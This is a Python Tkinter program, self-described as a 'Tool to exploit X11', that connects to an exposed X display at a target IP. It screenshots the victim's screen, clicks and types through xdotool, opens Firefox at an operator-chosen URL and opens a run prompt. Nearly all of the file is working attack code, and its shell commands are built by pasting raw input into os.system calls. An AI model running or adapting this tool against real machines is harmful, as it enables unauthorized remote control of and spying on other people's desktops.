from Tkinter import *
#from tkFileDialog import askopenfilename
#import Image, ImageTk, os, sys, time
import os, sys, time
#import PIL.ImageTk
from PIL import ImageTk, Image
#import Image
#ImageFile.LOAD_TRUNCATED_IMAGES = True

if __name__ == "__main__":
    root = Tk()

    #setting up a tkinter canvas with scrollbars
    frame = Frame(root, bd=2, relief=SUNKEN)
    frame.grid_rowconfigure(0, weight=1)
    frame.grid_columnconfigure(0, weight=1)
    xscroll = Scrollbar(frame, orient=HORIZONTAL)
    xscroll.grid(row=1, column=0, sticky=E+W)
    yscroll = Scrollbar(frame)
    yscroll.grid(row=0, column=1, sticky=N+S)
    canvas = Canvas(frame, bd=0, xscrollcommand=xscroll.set, yscrollcommand=yscroll.set)
    canvas.grid(row=0, column=0, sticky=N+S+E+W)
    xscroll.config(command=canvas.xview)
    yscroll.config(command=canvas.yview)
    frame.pack(fill=BOTH,expand=1)
    root.title("haX11")
    def getcordssend(event,txt,enter):
	print((event.x,event.y))
        print("text2: "+txt)
	senter = enter.get()
        global IP
        global canvas
        global img
        canvas.create_text(100,100,fill="darkblue",font="Times 20 italic bold", text="loading....")
        canvas.update()
        os.system('export DISPLAY='+IP+':0;xdotool mousemove '+str(event.x)+' '+str(event.y)+' click 1;xdotool --clearmodifiers type "'+txt+'"')
	if senter == 1:
		os.system('export DISPLAY='+IP+':0;xdotool key KP_Enter')
		print("enter sent")
	print("senter: "+str(senter))
        time.sleep(2)
        os.system('xwd -root -screen -silent -display '+IP+':0 > output.xwd')
        os.system('convert output.xwd output.png')
        time.sleep(2)
        canvas.delete("all")
        imgraw = "output.png"
        File = imgraw
        img = ImageTk.PhotoImage(Image.open(File))
        canvas.create_image(0,0,image=img,anchor="nw")
        print("test")
	canvas.bind("<Button 1>",printcoords)



    def send(e,popup,senter):
	#popup.destroy()
	print(senter.get())
	txt = e.get()
	canvas.bind("<Button 1>",lambda event: getcordssend(event,txt,senter))
	popup.destroy()

    def openPage(pop, url):
        os.system('export DISPLAY='+IP+':0;firefox '+url.get()+' &')
        time.sleep(5)
        os.system('export DISPLAY='+IP+':0;xdotool key F11')
        pop.destroy()

    def getURL():
	popup = Tk()
        popup.wm_title("URL")
        label = Label(popup, text="Enter url below you wish to open on targets system, hit \"Okay\", ", font=("Verdana", 10))
        label.pack(side="top", fill="x", pady=10)
	url = Entry(popup)
	url.pack()
        B1 = Button(popup, text="Okay", command = lambda: openPage(popup,url))
	B1.pack()
        popup.mainloop()

    def sendtext():
	popup = Tk()
        popup.wm_title("Send text")
        label = Label(popup, text="Enter text below, hit \"Okay\", then click on the screen where you want the text to go. i.e. a text input field", font=("Verdana", 10))
        label.pack(side="top", fill="x", pady=10)
	e = Entry(popup)
	e.pack()
	senter = IntVar(popup)
	b2 = Checkbutton(popup, text="Send enter key with text.", variable=senter)
        B1 = Button(popup, text="Okay", command = lambda: send(e,popup,senter))
        b2.pack()
	B1.pack()
        popup.mainloop()

    def about():
	popup = Tk()
        popup.wm_title("About")
        label = Label(popup, text="Tool to exploit X11 by Adam Espitia", font=("Verdana", 10))
        label.pack(side="top", fill="x", pady=10)
        #e = Entry(popup)
        #e.pack()
        B1 = Button(popup, text="Okay", command = popup.destroy)
        B1.pack()
        popup.mainloop()
  
    def ref():
        global IP
        global canvas
        global img
        canvas.create_text(100,100,fill="darkblue",font="Times 20 italic bold", text="refreshing....")
        canvas.update()
        os.system('xwd -root -screen -silent -display '+IP+':0 > output.xwd')
        os.system('convert output.xwd output.png')
        canvas.delete("all")
        imgraw = "output.png"
        File = imgraw
        img = ImageTk.PhotoImage(Image.open(File))
        canvas.create_image(0,0,image=img,anchor="nw")
    def openxterm():
	global IP
	os.system('export DISPLAY='+IP+':0;xdotool key alt+F2')#;xdotool type xterm;xdotool key KP_Enter')
	ref()

    b = Button(root, text="Send Txt", command=sendtext)
    b2 = Button(root, text="About", command=about)
    b3 = Button(root, text="Refresh", command=ref)
    b4 = Button(root, text="Open run prompt", command=openxterm)
    b5 = Button(root, text="Open URL", command=getURL)
    b.pack(side='left')
    b5.pack(side='left')
    b4.pack(side='left')
    b2.pack(side='right')
    b3.pack()

    #adding the image
    IP = sys.argv[1]
    os.system('xwd -root -screen -silent -display '+IP+':0 > output.xwd')
    os.system('convert output.xwd output.png')
    imgraw = "output.png"
    File = imgraw
    img = ImageTk.PhotoImage(Image.open(File))
    canvas.create_image(0,0,image=img,anchor="nw")
    canvas.config(scrollregion=canvas.bbox(ALL))

    def getclick(x,y):
	global IP
	global canvas
	global img
	canvas.create_text(100,100,fill="darkblue",font="Times 20 italic bold", text="loading....")
	canvas.update()
	os.system('export DISPLAY='+IP+':0')
	os.system('export DISPLAY='+IP+':0;xdotool mousemove '+str(x)+' '+str(y)+' click 1')
        time.sleep(2)
        os.system('xwd -root -screen -silent -display '+IP+':0 > output.xwd')
        os.system('convert output.xwd output.png')
        time.sleep(2)
	canvas.delete("all")
        imgraw = "output.png"
        File = imgraw
        img = ImageTk.PhotoImage(Image.open(File))
        canvas.create_image(0,0,image=img,anchor="nw")
	print('xdotool mousemove '+str(x)+' '+str(y)+' click 1')
	print("test")

    #function to be called when mouse is clicked
    def printcoords(event):
        #outputting x and y coords to console
        print((event.x,event.y))
        getclick(event.x,event.y)
    #mouseclick event
    canvas.bind("<Button 1>",printcoords)

    root.mainloop()
